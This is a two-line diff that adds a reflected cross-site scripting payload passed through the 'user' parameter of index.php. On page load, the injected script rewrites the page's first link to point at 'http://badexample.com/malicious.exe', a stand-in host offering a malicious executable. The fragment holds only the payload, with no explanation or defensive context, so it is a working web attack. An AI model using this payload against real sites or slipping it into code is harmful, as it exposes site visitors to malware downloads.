@@ -1,0 +1,2 @@
+index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");
+AllLinks[0].href = "http://badexample.com/malicious.exe"; }</script>
